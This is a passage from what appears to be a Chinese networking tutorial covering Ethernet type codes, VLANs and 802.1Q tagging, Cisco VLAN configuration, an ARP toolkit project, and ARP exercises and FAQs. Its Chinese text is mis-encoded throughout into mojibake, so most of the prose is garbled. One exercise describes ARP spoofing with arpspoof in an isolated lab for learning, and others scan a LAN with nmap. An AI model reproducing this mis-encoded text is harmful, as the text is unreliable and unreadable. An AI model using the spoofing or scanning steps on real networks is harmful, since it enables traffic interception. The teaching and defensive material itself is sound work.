x86asm">å¸¸è§ä»¥å¤ªç½‘ç±»å‹å€¼ï¼š<br><br><span class="hljs-number">0x0800</span> - IPv4<br>æœ€å¸¸è§çš„ç±»å‹<br><br><span class="hljs-number">0x0806</span> - ARP<br>åœ°å€è§£æåè®®<br><br><span class="hljs-number">0x86DD</span> - IPv6<br>IPv6æ•°æ®åŒ…<br><br><span class="hljs-number">0x8100</span> - <span class="hljs-number">802.</span><span class="hljs-number">1Q</span> VLANæ ‡ç­¾<br>VLANæ ‡è®°å¸§<br><br><span class="hljs-number">0x8847</span> - MPLSå•æ’­<br>MPLSæ ‡ç­¾<br><br><span class="hljs-number">0x8863</span> - PPPoEå‘ç°<br>PPPoEåè®®<br><br><span class="hljs-number">0x8864</span> - PPPoEä¼šè¯<br>PPPoEæ•°æ®<br><br>ç¤ºä¾‹ï¼š<span class="hljs-built_in">IP</span>æ•°æ®åŒ…çš„ä»¥å¤ªç½‘å¸§<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ç›®æ ‡MAC: aa:bb:cc:<span class="hljs-built_in">dd</span>:ee:ff             â”‚<br>â”‚ æºMAC: <span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span>               â”‚<br>â”‚ ç±»å‹: <span class="hljs-number">0x0800</span> (IPv4)                    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ <span class="hljs-built_in">IP</span>å¤´éƒ¨ï¼ˆ<span class="hljs-number">20</span>å­—èŠ‚ï¼‰                       â”‚<br>â”‚ TCPå¤´éƒ¨ï¼ˆ<span class="hljs-number">20</span>å­—èŠ‚ï¼‰                      â”‚<br>â”‚ HTTPæ•°æ®ï¼ˆå˜é•¿ï¼‰                       â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ FCS: xx:xx:xx:xx                       â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="6-3-VLANåŸºç¡€"><a href="#6-3-VLANåŸºç¡€" class="headerlink" title="6.3 VLANåŸºç¡€"></a>6.3 VLANåŸºç¡€</h3><p><strong>ä»€ä¹ˆæ˜¯VLANï¼Ÿ</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">VLAN</span> <span class="hljs-operator">=</span> Virtual Local Area Network<br>è™šæ‹Ÿå±€åŸŸç½‘<br><br>ä½œç”¨ï¼š<br>- åœ¨ç‰©ç†ç½‘ç»œä¸Šåˆ’åˆ†é€»è¾‘ç½‘ç»œ<br>- éš”ç¦»å¹¿æ’­åŸŸ<br>- æé«˜å®‰å…¨æ€§<br>- ç®€åŒ–ç®¡ç†<br><br>ä¼ ç»Ÿç½‘ç»œ vs VLANï¼š<br><br>ä¼ ç»Ÿï¼ˆä¸€ä¸ªäº¤æ¢æœº <span class="hljs-operator">=</span> ä¸€ä¸ªå¹¿æ’­åŸŸï¼‰ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚         äº¤æ¢æœº                     â”‚<br>â”œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¤<br>â”‚ PC1â”‚ PC2â”‚ PC3â”‚ PC4â”‚ PC5â”‚ PC6â”‚ PC7 â”‚<br>â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜<br>æ‰€æœ‰PCåœ¨åŒä¸€å¹¿æ’­åŸŸï¼Œèƒ½äº’ç›¸é€šä¿¡<br><br>VLANï¼ˆä¸€ä¸ªäº¤æ¢æœº <span class="hljs-operator">=</span> å¤šä¸ªè™šæ‹Ÿäº¤æ¢æœºï¼‰ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚         ç‰©ç†äº¤æ¢æœº                 â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚   VLAN <span class="hljs-number">10</span>       â”‚    VLAN <span class="hljs-number">20</span>       â”‚<br>â”‚  (ç ”å‘éƒ¨)       â”‚    (é”€å”®éƒ¨)      â”‚<br>â”œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ PC1â”‚ PC2â”‚ PC3   â”‚ PC4â”‚ PC5â”‚ PC6    â”‚<br>â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>ä¸åŒVLANéš”ç¦»ï¼Œä¸èƒ½ç›´æ¥é€šä¿¡<br><br>ä¼˜ç‚¹ï¼š<br>âœ… éš”ç¦»å¹¿æ’­<br>âœ… æé«˜å®‰å…¨<br>âœ… çµæ´»ç®¡ç†<br>âœ… é€»è¾‘åˆ†ç»„<br>âœ… è·¨åœ°åŸŸVLAN<br></code></pre></td></tr></table></figure><p><strong>802.1Q VLANæ ‡ç­¾</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">802.1Qæ ‡å‡†ï¼š<br>åœ¨ä»¥å¤ªç½‘å¸§ä¸­æ’å…¥4å­—èŠ‚VLANæ ‡ç­¾<br><br>æ ‡å‡†ä»¥å¤ªç½‘å¸§ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”<br>â”‚ ç›®æ ‡MAC â”‚ æºMAC   â”‚ ç±»å‹ â”‚  æ•°æ®   â”‚ FCS â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜<br><br>802.1Qæ ‡è®°å¸§ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”<br>â”‚ ç›®æ ‡MAC â”‚ æºMAC   â”‚VLANæ ‡ç­¾  â”‚ ç±»å‹ â”‚  æ•°æ®   â”‚ FCS â”‚<br>â”‚ 6å­—èŠ‚   â”‚ 6å­—èŠ‚   â”‚ 4å­—èŠ‚    â”‚2å­—èŠ‚ â”‚ 46-1500 â”‚4å­—èŠ‚â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜<br><br>VLANæ ‡ç­¾ï¼ˆ4å­—èŠ‚ï¼‰ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   TPID         â”‚ PCP â”‚ DEI â”‚    VID         â”‚<br>â”‚   16ä½         â”‚ 3ä½ â”‚ 1ä½ â”‚    12ä½        â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>TPIDï¼ˆTag Protocol Identifierï¼‰ï¼š<br><span class="hljs-bullet">- </span>å›ºå®šå€¼ï¼š0x8100<br><span class="hljs-bullet">- </span>æ ‡è¯†è¿™æ˜¯VLANæ ‡è®°å¸§<br><br>PCPï¼ˆPriority Code Pointï¼‰ï¼š<br><span class="hljs-bullet">- </span>3ä½ï¼Œ0-7<br><span class="hljs-bullet">- </span>æœåŠ¡è´¨é‡ï¼ˆQoSï¼‰ä¼˜å…ˆçº§<br><br>DEIï¼ˆDrop Eligible Indicatorï¼‰ï¼š<br><span class="hljs-bullet">- </span>1ä½<br><span class="hljs-bullet">- </span>æ ‡è®°æ˜¯å¦å¯ä¸¢å¼ƒ<br><br>VIDï¼ˆVLAN Identifierï¼‰ï¼š<br><span class="hljs-bullet">- </span>12ä½ï¼Œ0-4095<br><span class="hljs-bullet">- </span>VLAN ID<br><span class="hljs-bullet">- </span>0ï¼šé»˜è®¤VLAN<br><span class="hljs-bullet">- </span>1ï¼šé»˜è®¤VLANï¼ˆé€šå¸¸ï¼‰<br><span class="hljs-bullet">- </span>4095ï¼šä¿ç•™<br><span class="hljs-bullet">- </span>æœ‰æ•ˆèŒƒå›´ï¼š1-4094<br><br>ç¤ºä¾‹ï¼š<br>VLAN ID = 10<br>æ ‡ç­¾ï¼š81 00 00 0A<br></code></pre></td></tr></table></figure><p><strong>VLANé…ç½®ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sqf">Ciscoäº¤æ¢æœºé…ç½®ï¼š<br><br><span class="hljs-number">1</span>. åˆ›å»ºVLAN<br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># vlan 10</span><br><span class="hljs-keyword">Switch</span>(config-vlan)<span class="hljs-meta"># name VLAN_DEV</span><br><span class="hljs-keyword">Switch</span>(config-vlan)<span class="hljs-meta"># exit</span><br><br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># vlan 20</span><br><span class="hljs-keyword">Switch</span>(config-vlan)<span class="hljs-meta"># name VLAN_SALES</span><br><span class="hljs-keyword">Switch</span>(config-vlan)<span class="hljs-meta"># exit</span><br><br><span class="hljs-number">2</span>. åˆ†é…ç«¯å£åˆ°VLAN<br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># interface GigabitEthernet0/1</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport mode access</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport access vlan 10</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># exit</span><br><br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># interface GigabitEthernet0/2</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport mode access</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport access vlan 20</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># exit</span><br><br><span class="hljs-number">3</span>. é…ç½®Trunkç«¯å£ï¼ˆè¿æ¥äº¤æ¢æœºï¼‰<br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># interface GigabitEthernet0/24</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport mode trunk</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport trunk allowed vlan 10,20</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># exit</span><br><br><span class="hljs-number">4</span>. æŸ¥çœ‹VLAN<br><span class="hljs-keyword">Switch</span><span class="hljs-meta"># show vlan brief</span><br><br>VLAN <span class="hljs-built_in">Name</span>                             Status    Ports<br>---- -------------------------------- --------- -------------------------------<br><span class="hljs-number">1</span>    <span class="hljs-keyword">default</span>                          active    Gi0/<span class="hljs-number">3</span>, Gi0/<span class="hljs-number">4</span><br><span class="hljs-number">10</span>   VLAN_DEV                         active    Gi0/<span class="hljs-number">1</span><br><span class="hljs-number">20</span>   VLAN_SALES                       active    Gi0/<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><hr><h2 id="7-å®æˆ˜é¡¹ç›®ï¼šARPå·¥å…·å¥—ä»¶"><a href="#7-å®æˆ˜é¡¹ç›®ï¼šARPå·¥å…·å¥—ä»¶" class="headerlink" title="7. å®æˆ˜é¡¹ç›®ï¼šARPå·¥å…·å¥—ä»¶"></a>7. å®æˆ˜é¡¹ç›®ï¼šARPå·¥å…·å¥—ä»¶</h2><h3 id="7-1-é¡¹ç›®éœ€æ±‚"><a href="#7-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="7.1 é¡¹ç›®éœ€æ±‚"></a>7.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> ARPç¼“å­˜æŸ¥çœ‹å’Œç®¡ç†<br><span class="hljs-bullet">   -</span> æ˜¾ç¤ºARPè¡¨<br><span class="hljs-bullet">   -</span> æ·»åŠ /åˆ é™¤æ¡ç›®<br><span class="hljs-bullet">   -</span> æ¸…ç©ºç¼“å­˜<br><br><span class="hljs-bullet">2.</span> ARPæ‰«æ<br><span class="hljs-bullet">   -</span> æ‰«æå±€åŸŸç½‘ä¸»æœº<br><span class="hljs-bullet">   -</span> å‘ç°æ´»åŠ¨ä¸»æœº<br><span class="hljs-bullet">   -</span> MACåœ°å€è¯†åˆ«<br><br><span class="hljs-bullet">3.</span> ARPç›‘æ§<br><span class="hljs-bullet">   -</span> å®æ—¶ç›‘æ§ARPæµé‡<br><span class="hljs-bullet">   -</span> æ£€æµ‹ARPå˜åŒ–<br><span class="hljs-bullet">   -</span> è­¦å‘Šå¼‚å¸¸<br><br><span class="hljs-bullet">4.</span> ARPå®‰å…¨æ£€æµ‹<br><span class="hljs-bullet">   -</span> æ£€æµ‹ARPæ¬ºéª—<br><span class="hljs-bullet">   -</span> IP/MACå†²çªæ£€æµ‹<br><span class="hljs-bullet">   -</span> ç½‘å…³éªŒè¯<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> Pythonå®ç°<br><span class="hljs-bullet">-</span> åŸå§‹å¥—æ¥å­—<br><span class="hljs-bullet">-</span> å‹å¥½çš„è¾“å‡º<br><span class="hljs-bullet">-</span> è·¨å¹³å°æ”¯æŒ<br></code></pre></td></tr></table></figure><h3 id="7-2-å·¥å…·æ¼”ç¤º"><a href="#7-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="7.2 å·¥å…·æ¼”ç¤º"></a>7.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ARPç¼“å­˜æŸ¥çœ‹</span><br>python day25_arp_tool.py --show<br><br><span class="hljs-comment"># ARPæ‰«æ</span><br><span class="hljs-built_in">sudo</span> python day25_arp_tool.py --scan 192.168.1.0/24<br><br><span class="hljs-comment"># ARPç›‘æ§</span><br><span class="hljs-built_in">sudo</span> python day25_arp_tool.py --monitor<br><br><span class="hljs-comment"># å®‰å…¨æ£€æµ‹</span><br><span class="hljs-built_in">sudo</span> python day25_arp_tool.py --detect<br></code></pre></td></tr></table></figure><hr><h2 id="8-ä»Šæ—¥ç»ƒä¹ "><a href="#8-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="8. ä»Šæ—¥ç»ƒä¹ "></a>8. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šARPåˆ†æ"><a href="#ç»ƒä¹ 1ï¼šARPåˆ†æ" class="headerlink" title="ç»ƒä¹ 1ï¼šARPåˆ†æ"></a>ç»ƒä¹ 1ï¼šARPåˆ†æ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æŸ¥çœ‹æœ¬æœºARPç¼“å­˜ï¼š<br>   arp -a<br><br>   åˆ†æï¼š<br><span class="hljs-bullet">   -</span> æœ‰å¤šå°‘æ¡ç›®ï¼Ÿ<br><span class="hljs-bullet">   -</span> å“ªäº›æ˜¯åŠ¨æ€çš„ï¼Ÿ<br><span class="hljs-bullet">   -</span> ç½‘å…³MACæ˜¯ä»€ä¹ˆï¼Ÿ<br><br><span class="hljs-bullet">2.</span> æ¸…ç©ºARPç¼“å­˜åpingç½‘å…³ï¼š<br>   sudo ip neigh flush all<br>   ping -c 1 192.168.1.1<br>   arp -a<br><br>   è§‚å¯ŸARPè¡¨çš„å˜åŒ–<br><br><span class="hljs-bullet">3.</span> ä½¿ç”¨tcpdumpæŠ“å–ARPåŒ…ï¼š<br>   sudo tcpdump -i eth0 arp -vv<br><br>   åˆ†æARPè¯·æ±‚å’Œåº”ç­”<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šARPå®éªŒ"><a href="#ç»ƒä¹ 2ï¼šARPå®éªŒ" class="headerlink" title="ç»ƒä¹ 2ï¼šARPå®éªŒ"></a>ç»ƒä¹ 2ï¼šARPå®éªŒ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å®éªŒ1ï¼šARPç¼“å­˜è¶…æ—¶<br><span class="hljs-bullet">1.</span> è®°å½•ä¸€ä¸ªåŠ¨æ€ARPæ¡ç›®<br><span class="hljs-bullet">2.</span> ç­‰å¾…ä¸€æ®µæ—¶é—´<br><span class="hljs-bullet">3.</span> è§‚å¯Ÿæ¡ç›®æ˜¯å¦æ¶ˆå¤±<br><span class="hljs-bullet">4.</span> å†æ¬¡pingï¼Œè§‚å¯ŸARPè¯·æ±‚<br><br>å®éªŒ2ï¼šé™æ€ARP<br><span class="hljs-bullet">1.</span> æ·»åŠ é™æ€ARPï¼š<br>   sudo arp -s <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span></span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MAC</span>&gt;</span></span><br><span class="hljs-bullet">2.</span> å°è¯•ping<br><span class="hljs-bullet">3.</span> åˆ é™¤é™æ€ARP<br><span class="hljs-bullet">4.</span> å¯¹æ¯”å·®å¼‚<br><br>å®éªŒ3ï¼šARPæ‰«æ<br>ä½¿ç”¨nmapæ‰«æå±€åŸŸç½‘ï¼š<br>nmap -sn 192.168.1.0/24<br>è§‚å¯Ÿå‘ç°çš„ä¸»æœº<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šå®‰å…¨æµ‹è¯•"><a href="#ç»ƒä¹ 3ï¼šå®‰å…¨æµ‹è¯•" class="headerlink" title="ç»ƒä¹ 3ï¼šå®‰å…¨æµ‹è¯•"></a>ç»ƒä¹ 3ï¼šå®‰å…¨æµ‹è¯•</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åœ¨éš”ç¦»çš„æµ‹è¯•ç¯å¢ƒä¸­ï¼š<br><br><span class="hljs-bullet">1.</span> æ­å»ºæµ‹è¯•ç½‘ç»œ<br><span class="hljs-bullet">   -</span> 2-3å°è™šæ‹Ÿæœº<br><span class="hljs-bullet">   -</span> åŒä¸€ç½‘ç»œ<br><br><span class="hljs-bullet">2.</span> æµ‹è¯•ARPæ¬ºéª—ï¼ˆä»…ç”¨äºå­¦ä¹ ï¼‰<br><span class="hljs-bullet">   -</span> ä½¿ç”¨arpspoof<br><span class="hljs-bullet">   -</span> è§‚å¯Ÿæµé‡<br><span class="hljs-bullet">   -</span> éªŒè¯é˜²å¾¡æªæ–½<br><br><span class="hljs-bullet">3.</span> éƒ¨ç½²é˜²å¾¡<br><span class="hljs-bullet">   -</span> é…ç½®é™æ€ARP<br><span class="hljs-bullet">   -</span> ä½¿ç”¨ç›‘æ§å·¥å…·<br><span class="hljs-bullet">   -</span> æµ‹è¯•æ•ˆæœ<br><br>æ³¨æ„ï¼š<br>âš ï¸ ä»…åœ¨è‡ªå·±çš„æµ‹è¯•ç¯å¢ƒä¸­è¿›è¡Œ<br>âš ï¸ ä¸è¦åœ¨ç”Ÿäº§ç½‘ç»œæµ‹è¯•<br>âš ï¸ ARPæ¬ºéª—æ˜¯è¿æ³•è¡Œä¸º<br></code></pre></td></tr></table></figure><hr><h2 id="9-å¸¸è§é—®é¢˜"><a href="#9-å¸¸è§é—®é¢˜" class="headerlink" title="9. å¸¸è§é—®é¢˜"></a>9. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šä¸ºä»€ä¹ˆARPä½¿ç”¨å¹¿æ’­ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ARPåœ¨æ•°æ®é“¾è·¯å±‚å·¥ä½œ</li><li>ä¸çŸ¥é“ç›®æ ‡MACåœ°å€</li><li>åªèƒ½ä½¿ç”¨å¹¿æ’­è®©æ‰€æœ‰ä¸»æœºæ”¶åˆ°</li><li>ç›®æ ‡ä¸»æœºè¯†åˆ«å‡ºæ˜¯è‡ªå·±çš„IPåå“åº”</li></ul><p><strong>Q2ï¼šARPç¼“å­˜ä¸ºä»€ä¹ˆä¼šè¶…æ—¶ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ä¸»æœºå¯èƒ½æ›´æ¢ç½‘å¡ï¼ˆMACå˜åŒ–ï¼‰</li><li>IPåœ°å€å¯èƒ½é‡æ–°åˆ†é…</li><li>é¿å…ç¼“å­˜è¿‡æœŸä¿¡æ¯</li><li>å…¸å‹è¶…æ—¶ï¼š2-20åˆ†é’Ÿ</li></ul><p><strong>Q3ï¼šå¦‚ä½•é˜²æ­¢ARPæ”»å‡»ï¼Ÿ</strong></p><p>Aï¼š<br>æœ€ä½³æ–¹æ¡ˆç»„åˆï¼š</p><ol><li>äº¤æ¢æœºå¯ç”¨DAIå’ŒDHCP Snooping</li><li>å…³é”®æœåŠ¡å™¨ä½¿ç”¨é™æ€ARP</li><li>ä½¿ç”¨HTTPSç­‰åŠ 